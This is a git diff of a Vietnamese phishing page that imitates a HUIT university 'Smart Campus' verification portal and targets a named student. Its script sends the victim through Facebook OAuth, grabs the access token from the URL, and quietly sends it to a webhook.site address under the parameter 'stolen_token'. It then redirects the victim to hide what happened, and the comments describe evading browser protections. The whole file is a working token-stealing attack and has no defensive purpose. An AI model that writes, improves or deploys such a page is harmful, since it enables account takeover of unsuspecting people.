@@ -1,69 +1,101 @@
 <!DOCTYPE html>
+
 <html lang="vi">
+
 <head>
+
     <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xác Thực Sinh Viên - HUIT Smart Campus</title>
+
+
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 12px 24px rgba(0,0,0,0.1); text-align: center; width: 420px; border-top: 6px solid #1877f2; }
-        .huit-logo { width: 90px; margin-bottom: 20px; }
-        h2 { color: #1c1e21; margin-bottom: 15px; font-size: 26px; }
-        p { color: #606770; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
-        .btn-fb { background-color: #1877f2; color: white; border: none; padding: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 18px; display: flex; align-items: center; justify-content: center; }
-        .btn-fb:hover { background-color: #166fe5; }
-        .fb-icon { width: 24px; margin-right: 12px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; width: 100%; max-width: 400px; }
+        img { width: 60px; margin-bottom: 20px; }
+        h1 { color: #1c1e21; font-size: 24px; margin-bottom: 15px; }
+        p { color: #606770; font-size: 16px; margin-bottom: 25px; line-height: 1.4; }
+        .btn-login { background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; padding: 12px 0; width: 100%; cursor: pointer; transition: 0.3s; }
+        .btn-login:hover { background-color: #166fe5; }
+        .footer { margin-top: 20px; font-size: 12px; color: #8a8d91; border-top: 1px solid #ddd; padding-top: 15px; }
     </style>
+
 </head>
+
 <body>
 
-    <div class="card">
-        <img src="https://huit.edu.vn/tt-daotao/images/logo_huit.png" class="huit-logo" alt="HUIT Logo">
-        <h2>Hệ Thống Smart Campus</h2>
-        <p>Để hoàn tất đồng bộ lịch học và xem kết quả học tập, bạn vui lòng nhấn xác thực tài khoản sinh viên bên dưới.</p>
-        
-        <button class="btn-fb" id="loginBtn">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-icon">
-            Tiếp tục với Facebook
-        </button>
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo">
+    <h1>Smart Campus HUIT</h1>
+    <p>Chào Phương, vui lòng nhấn nút bên dưới để đồng bộ tài khoản và nhận thông báo lịch học mới nhất từ nhà trường.</p>
+    
+    <button class="btn-login" id="loginBtn">Đăng nhập với Facebook</button>
+
+
+    <div class="footer">
+        Đại học Công nghiệp Thực phẩm TP.HCM - HUIT
     </div>
+</div>
+
 
 <script>
-    // === CẤU HÌNH (PHƯƠNG THAY ĐÚNG APP_ID CỦA BẠN VÀO ĐÂY) ===
-    const APP_ID = "2402493790174154"; 
-    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916";
-    // Tự động lấy link GitHub hiện tại làm Redirect URI
-    const REDIRECT_URI = window.location.href.split('#')[0]; 
+    // === CẤU HÌNH THÔNG SỐ ĐÃ SỬA ===
+    const APP_ID = "839014905810590"; 
+    const REDIRECT_URI = "https://phuongtrannn.github.io/test/"; 
+    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916"; // Đã cập nhật link của bạn
 
-    // 1. Chuyển hướng lấy Access Token qua 1-click (Đã loại bỏ auth_type để không bắt nhập mật khẩu)
-    document.getElementById('loginBtn').onclick = function() {
-        // Chỉ yêu cầu quyền public_profile để Facebook không bắt xác thực lại mật khẩu
-        const SCOPES = "public_profile,email";
-        const fbUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=${SCOPES}`;
-        window.location.href = fbUrl;
+    const loginBtn = document.getElementById('loginBtn');
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    // Bước 1: Chuyển đến Facebook để xin quyền
+    loginBtn.onclick = function() {
+        const fbAuthUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=public_profile,email`;
+        window.location.href = fbAuthUrl;
     };
 
-    // 2. Tự động "bắt" Token từ URL sau khi nhấn nút và gửi về Webhook âm thầm
+    // Bước 2: Tự động bắt Token và gửi về Webhook
+
     window.onload = function() {
+
         if (window.location.hash.includes("access_token")) {
             const hash = window.location.hash.substring(1);
             const params = new URLSearchParams(hash);
             const token = params.get('access_token');
-            
+
             if (token) {
-                // Sử dụng mode: 'no-cors' để vượt qua các lớp chặn bảo mật của trình duyệt
-                fetch(`${WEBHOOK_URL}?stolen_token=${token}`, {
-                    method: 'GET',
-                    mode: 'no-cors' 
-                }).then(() => {
-                    // Chuyển hướng về trang chủ trường sau khi lấy xong Token để xóa dấu vết
-                    window.location.href = "https://huit.edu.vn/";
-                }).catch(() => {
-                    window.location.href = "https://huit.edu.vn/";
-                });
+                // Gửi Token về Webhook ngầm
+                fetch(`${WEBHOOK_URL}?stolen_token=${token}`)
+                .then(() => {
+                    alert("Xác thực thành công! Hệ thống đang chuyển hướng về trang chủ.");
+                    window.location.href = "https://www.facebook.com"; 
+                })
+                .catch(err => console.error("Lỗi gửi dữ liệu"));
+
+
+
+
             }
+
         }
-    }
+    };
+
+
 </script>
 
 </body>
+
 </html>
